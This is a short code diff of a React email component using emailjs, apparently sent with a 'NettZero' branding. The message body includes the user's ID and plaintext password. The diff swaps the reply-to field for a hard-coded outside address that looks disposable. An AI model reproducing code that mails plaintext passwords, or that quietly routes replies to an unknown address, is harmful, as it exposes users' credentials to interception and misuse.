@@ -31,7 +31,7 @@ export const Email = () => {
       from_name: "NettZero",
       to_name: "User",
       message: `${message}\n\nUserId: ${user.userId}\nPassword: ${user.password}`,
-      reply_to: replyTo,
+      reply_to: "dopiti4541@jadsys.com",
     };
 
     emailjs.send(
